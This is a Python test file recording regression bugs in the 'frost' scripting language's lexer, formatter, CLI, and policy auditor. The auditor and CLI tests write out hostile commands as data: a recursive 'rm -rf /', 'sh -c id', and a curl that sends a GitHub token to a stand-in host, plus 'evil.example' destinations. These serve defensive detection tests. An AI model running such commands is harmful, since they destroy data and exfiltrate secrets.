"""Bugs a review found, each pinned by the smallest script that showed it.

They are grouped here rather than scattered because they share a shape: every
one was a place where frost's own promises (the front end never crashes, the
formatter never changes meaning, the gate means what it says) held for the
inputs somebody thought of and not for the next one along.
"""

import json
import os
import subprocess
import sys

import pytest

from frostlang import cli
from frostlang.diagnostics import collect_diagnostics, repair_until_stuck
from frostlang.formatter import format_source
from frostlang.lexer import LexError, tokenize
from frostlang.parser import ParseError, parse

from helpers import REPO, out, run_failing


def frost(*args, cwd=None, env=None, stdin=None, timeout=60):
    environ = {**os.environ, "PYTHONPATH": REPO}
    environ.pop("FROST_AUTOMATED", None)
    environ.update(env or {})
    p = subprocess.run([sys.executable, os.path.join(REPO, "frost"), *args],
                       capture_output=True, text=True, env=environ, cwd=cwd,
                       input=stdin, timeout=timeout)
    return p.returncode, p.stdout, p.stderr


# ---------------------------------------------------------------- front end

def test_a_hundred_nested_parentheses_are_a_parse_error():
    with pytest.raises(ParseError) as e:
        parse("put " + "(" * 100 + "1" + ")" * 100)
    assert "nested too deeply" in e.value.msg


def test_a_backslash_before_a_newline_does_not_continue_a_string():
    with pytest.raises(LexError) as e:
        tokenize('put "abc \\\nmore" into x\n')
    assert e.value.line == 1
    assert "unterminated" in e.value.msg


def test_later_errors_keep_their_line_numbers_after_a_backslash():
    # The string used to swallow the newline without counting it.
    with pytest.raises(LexError) as e:
        tokenize('put "a"\nput "b \\\n')
    assert e.value.line == 2


# ---------------------------------------------------------------- formatter

@pytest.mark.parametrize("control", ["\\n", "\\t", "\\r", "\\0"])
def test_a_backslash_before_a_control_character_survives_formatting(control):
    src = f'put "a\\\\{control}b" into x\nput x\n'
    formatted = format_source(src)
    assert parse(formatted) == parse(src)
    assert out(formatted) == out(src)


@pytest.mark.parametrize("literal", ["0.00001", "123456789012345678901.5"])
def test_a_float_that_str_writes_with_an_exponent_keeps_its_digits(literal):
    src = f"put {literal} into x\n"
    formatted = format_source(src)
    assert "e" not in formatted.replace("put", "").replace("into", "")
    assert parse(formatted) == parse(src)


def test_ordinary_numbers_are_still_written_canonically():
    assert format_source("put 1.50 + 007\n") == "put 1.5 + 7\n"


# ---------------------------------------------------------------- numbers

@pytest.mark.parametrize("text", ["inf", "nan", "Infinity", "1_000", "0x10"])
def test_text_python_or_javascript_would_take_is_not_a_number(text):
    _, e = run_failing(f'put "{text}" + 1\n')
    assert "is not a number" in e.msg


@pytest.mark.parametrize("src", [
    'repeat "inf" times\n  put 1\nend repeat\n',
    'quit with status "nan"\n',
    'put the rounded "inf"\n',
])
def test_a_non_finite_count_is_a_frost_error(src):
    _, e = run_failing(src)
    assert e.msg


def test_nan_compares_as_text_and_so_equals_itself():
    assert out('if "nan" is "nan" then put "same"\n') == "same"


@pytest.mark.parametrize("expr, message", [
    ("10.0 ^ 400", "too large"),
    ("10 ^ 5000", "too large"),
    ("2 ^ 100000000", "too large"),
    ("0 ^ -1", "divide by zero"),
    ("(0 - 8) ^ 0.5", "no real-number answer"),
])
def test_power_reports_what_it_cannot_compute(expr, message):
    _, e = run_failing(f"put {expr}\n")
    assert message in e.msg


def test_exponent_notation_in_text_is_still_a_number():
    assert out('put "1e3" + 1\n') == "1001"


# ---------------------------------------------------------------- if chains

def test_a_single_line_else_if_is_closed_by_end_if():
    src = ("put 5 into n\n"
           "if n is 1 then\n"
           "  put \"one\"\n"
           "else if n is 5 then put \"five\"\n"
           "end if\n"
           "put \"after\"\n")
    assert out(src) == "five\nafter"


def test_a_single_line_else_if_without_end_if_is_refused():
    with pytest.raises(ParseError):
        parse("if 1 is 2 then\n  put 1\nelse if 1 is 1 then put 2\n")


def test_a_block_else_if_chain_still_shares_one_end_if():
    src = ("put 3 into n\n"
           "if n is 1 then\n  put 1\n"
           "else if n is 2 then\n  put 2\n"
           "else if n is 3 then\n  if n is 3 then put \"guard\"\n  put 3\n"
           "else\n  put 0\n"
           "end if\n")
    assert out(src) == "guard\n3"


# ---------------------------------------------------------------- processes

def test_output_that_is_not_utf8_is_replaced_not_refused():
    assert out('run "printf" with "\\\\377"\nput the result\n') == "0"


def test_undecodable_pipe_output_is_replaced_not_a_traceback():
    assert out('pipe\n  run "printf" with "\\\\377"\n  run "cat"\nend pipe\n'
               'put the result\n') == "0"


def test_a_nul_in_a_pipe_argument_is_a_frost_error():
    _, e = run_failing('pipe\n  run "echo" with "a\\0b"\n  run "cat"\n'
                       'end pipe\n')
    assert "cannot be passed to a program" in e.msg


def test_a_file_with_no_interpreter_line_is_a_frost_error(tmp_path):
    script = tmp_path / "noshebang"
    script.write_text("echo hi\n")
    script.chmod(0o755)
    for src in (f'run "{script}"\n',
                f'pipe\n  run "{script}"\n  run "cat"\nend pipe\n'):
        _, e = run_failing(src)
        assert "could not be started" in e.msg
        assert "#!" in e.hint


def test_a_pipe_hands_a_secret_to_its_first_stage_in_the_clear(tmp_path):
    script = tmp_path / "s.frost"
    # Counted, because anything the script reads back is masked either way:
    # the byte count is what tells the plaintext from the marker.
    script.write_text('pipe reading the secret environment variable "TOK"\n'
                      '  run "cat"\n  run "wc" with "-c"\nend pipe\n'
                      'put the trimmed it\n')
    status, stdout, err = frost(str(script), env={"TOK": "hunter22"})
    assert status == 0, err
    assert stdout.strip() == str(len("hunter22\n"))


def test_a_secret_on_a_pipes_standard_error_is_redacted_not_a_crash(tmp_path):
    script = tmp_path / "s.frost"
    script.write_text(
        'put the secret environment variable "TOK" into t\n'
        'try to pipe\n  run "echo" with "x"\n'
        '  run "sh" with "-c", "echo $0 >&2; exit 1", t\nend pipe\n'
        'put the error output\n')
    status, stdout, err = frost(str(script), env={"TOK": "hunter22"})
    assert status == 0, err
    assert "hunter22" not in stdout + err
    assert "«secret TOK»" in stdout


# ---------------------------------------------------------------- modules

def test_a_handler_defined_in_a_block_is_callable_in_a_file_with_imports(
        tmp_path):
    (tmp_path / "lib.frost").write_text('to greet\n  return "hi"\nend greet\n')
    main = tmp_path / "main.frost"
    main.write_text('use "lib.frost" for the greet\n'
                    'if true then\n  to shout\n    put "SHOUT"\n'
                    '  end shout\nend if\nshout\n')
    status, stdout, err = frost(str(main))
    assert (status, stdout.strip()) == (0, "SHOUT"), err


def test_a_symlink_cannot_carry_a_module_out_of_the_script_directory(
        tmp_path):
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "lib.frost").write_text('to evil\n  put "ran"\nend evil\n')
    project = tmp_path / "proj"
    project.mkdir()
    (project / "vendor").symlink_to(outside)
    main = project / "main.frost"
    main.write_text('use "vendor/lib.frost" for the evil\nevil\n')
    status, stdout, err = frost(str(main))
    assert status == 2
    assert "ran" not in stdout
    assert "symbolic link" in err


def test_a_symlink_that_stays_inside_the_directory_still_loads(tmp_path):
    (tmp_path / "real").mkdir()
    (tmp_path / "real" / "lib.frost").write_text(
        'to hi\n  put "in"\nend hi\n')
    (tmp_path / "alias").symlink_to(tmp_path / "real")
    main = tmp_path / "main.frost"
    main.write_text('use "alias/lib.frost" for the hi\nhi\n')
    status, stdout, err = frost(str(main))
    assert (status, stdout.strip()) == (0, "in"), err


# ---------------------------------------------------------------- journal

def test_a_run_that_released_a_secret_replays(tmp_path):
    script = tmp_path / "s.frost"
    script.write_text('put the secret environment variable "TOK" into t\n'
                      'run "echo" with "check", t\nput "done"\n')
    rec = tmp_path / "rec.json"
    env = {"TOK": "hunter22"}
    assert frost("--record", str(rec), str(script), env=env)[0] == 0
    assert "hunter22" not in rec.read_text()
    status, stdout, err = frost("--replay", str(rec), str(script), env=env)
    assert (status, stdout.strip()) == (0, "done"), err


def test_a_command_that_timed_out_is_recorded_and_replays(tmp_path):
    script = tmp_path / "s.frost"
    script.write_text('try to run "sleep" with "5" within 200 milliseconds\n'
                      'put "result " & the result\n')
    rec = tmp_path / "rec.json"
    status, stdout, _ = frost("--record", str(rec), str(script))
    assert stdout.strip() == "result 124"
    events = json.loads(rec.read_text())["events"]
    assert any(e.get("timed_out") for e in events)
    status, stdout, err = frost("--replay", str(rec), str(script))
    assert (status, stdout.strip()) == (0, "result 124"), err


# ---------------------------------------------------------------- cli

def test_a_passing_policy_does_not_stop_json_from_running_the_script(
        tmp_path):
    (tmp_path / "p.policy").write_text('forbid running "sudo"\n')
    script = tmp_path / "s.frost"
    script.write_text('put "x" into file "ran.txt"\nquit with status 7\n')
    status, _, _ = frost("--policy", "p.policy", "--json", "s.frost",
                         cwd=str(tmp_path))
    assert status == 7
    assert (tmp_path / "ran.txt").exists()


def test_a_passing_policy_does_not_let_a_dangerous_script_past_strict(
        tmp_path):
    (tmp_path / "p.policy").write_text('forbid running "sudo"\n')
    (tmp_path / "s.frost").write_text('run "rm" with "-rf", "/"\n')
    status, stdout, _ = frost("--policy", "p.policy", "--check", "--json",
                              "--strict", "s.frost", cwd=str(tmp_path))
    assert status == 1
    assert json.loads(stdout)["verdict"] == "dangerous"


def test_a_blocking_policy_still_reports_as_json(tmp_path):
    (tmp_path / "p.policy").write_text('forbid running "rm"\n')
    (tmp_path / "s.frost").write_text('run "rm" with "-rf", "/"\n')
    status, stdout, _ = frost("--policy", "p.policy", "--json", "s.frost",
                              cwd=str(tmp_path))
    assert status == 3
    assert json.loads(stdout)["ok"] is False


def test_a_script_that_is_not_utf8_is_refused_with_a_message(tmp_path):
    script = tmp_path / "s.frost"
    script.write_bytes(b'put "caf\xe9"\n')
    status, _, err = frost("--check", str(script))
    assert status == 2
    assert "not UTF-8" in err
    assert "Traceback" not in err


def test_format_write_refuses_standard_input(tmp_path):
    status, _, err = frost("--format", "--write", "-", cwd=str(tmp_path),
                           stdin="put   1\n")
    assert status == 2
    assert "--write needs a file" in err
    assert os.listdir(tmp_path) == []


def test_every_exit_code_frost_returns_is_listed():
    codes = {code for code, _, _ in cli.EXIT_CODES}
    assert {124, 125} <= codes


def test_an_abbreviated_flag_is_refused_rather_than_misparsed(tmp_path):
    (tmp_path / "s.frost").write_text('put "ran"\n')
    status, stdout, err = frost("--trace-to", "t.log", "s.frost",
                                cwd=str(tmp_path))
    assert status == 2
    assert "ran" not in stdout


# ---------------------------------------------------------------- repair

def test_repair_keeps_the_guard_in_front_of_a_run():
    src = 'if confirmed is "yes" then run "rm -rf build"\n'
    repaired, _ = repair_until_stuck(src)
    assert repaired == 'if confirmed is "yes" then run "rm" with "-rf", ' \
                       '"build"\n'


def test_repair_keeps_what_follows_a_run_and_its_escapes():
    src = 'run "printf a\\\\tb" within 5 seconds\n'
    repaired, _ = repair_until_stuck(src)
    assert repaired == 'run "printf" with "a\\\\tb" within 5 seconds\n'
    assert parse(repaired)


def test_the_run_hint_quotes_each_argument_the_way_the_lexer_reads_it():
    diagnostic = collect_diagnostics("s.frost", 'run "grep a\\"b"\n')[0]
    assert 'with "a\\"b"' in diagnostic.hint


# ---------------------------------------------------------------- auditor
#
# Everything below reads scripts and never runs them: the scripts are the ones
# a policy exists to stop.

def refusals(src, policy):
    from frostlang.audit import check, parse_policy
    from helpers import caps_for
    return [f.what for f in check(caps_for(src), parse_policy(policy))
            if f.severity == "forbid"]


def danger_titles(src):
    from helpers import dangers_for
    return {f.title for f in dangers_for(src) if f.severity == "danger"}


@pytest.mark.parametrize("program", ["sudo", "/usr/bin/sudo"])
def test_forbidding_a_program_covers_it_written_as_a_path(program):
    assert refusals(f'run "{program}" with "true"\n',
                    'forbid running "sudo"\n')


def test_forbidding_arguments_covers_the_program_written_as_a_path():
    assert refusals('run "/bin/rm" with "-rf", "/srv/data"\n',
                    'forbid running "rm" with "-rf"\n')


def test_a_path_to_a_program_is_not_an_allow_list_loophole():
    # The other direction must not loosen: allowing git is not allowing any
    # file that happens to be called git.
    assert refusals('run "/tmp/x/git" with "status"\n',
                    'require running only "git"\n')


def test_dangers_are_found_behind_a_full_path():
    found = danger_titles('run "/bin/rm" with "-rf", "/srv/data"\n'
                          'run "/bin/sh" with "-c", "id"\n'
                          'put the environment variable "GITHUB_TOKEN" '
                          'into t\n'
                          'run "/usr/bin/curl" with "-d", t, '
                          '"https://x.example/"\n')
    assert "Recursive forced delete" in found
    assert "Shell escape via sh -c" in found
    assert "Secrets read, then the network is contacted" in found


@pytest.mark.parametrize("path", ["/tmp/../etc/hosts", "//etc/hosts",
                                  "/etc/./hosts"])
def test_a_path_is_matched_where_it_really_points(path):
    assert refusals(f'put "x" into file "{path}"\n',
                    'forbid writing to "/etc/*"\n')
    assert "Writes to a system location" in \
        {t.split(" (")[0] for t in danger_titles(f'put "x" into file '
                                                 f'"{path}"\n')}


REACHING = 'require reaching only "api.github.com"\n'


@pytest.mark.parametrize("src", [
    # a second destination with no scheme
    'run "curl" with "https://api.github.com/zen", "evil.example/x" '
    'within 5 seconds\n',
    # a second destination held in a name
    'put "evil.example" into target\n'
    'run "curl" with "https://api.github.com/zen", target within 5 seconds\n',
    # a second destination read at runtime
    'run "curl" with "https://api.github.com/zen", '
    'the first line of the standard input within 5 seconds\n',
])
def test_one_allowed_url_does_not_vouch_for_the_other_destinations(src):
    assert refusals(src, REACHING)


def test_option_values_are_not_mistaken_for_destinations():
    src = ('put the environment variable "GITHUB_TOKEN" into t\n'
           'run "curl" with "-sSo", "out.json", "-H", "Authorization: " & t, '
           '"--max-time", "5", "https://api.github.com/zen" '
           'within 10 seconds\n')
    assert refusals(src, REACHING) == []


def test_the_runtime_check_refuses_a_destination_it_cannot_read():
    from frostlang.interp import Interpreter, FrostError
    interp = Interpreter(argv=[])
    interp.host_rules = ([], ["api.github.com"])
    interp.check_hosts(["curl", "-o", "out.json",
                        "https://api.github.com/zen"], 1)
    with pytest.raises(FrostError) as e:
        interp.check_hosts(["curl", "https://api.github.com/zen",
                            "evil.example/x"], 1)
    assert "no scheme" in e.value.msg
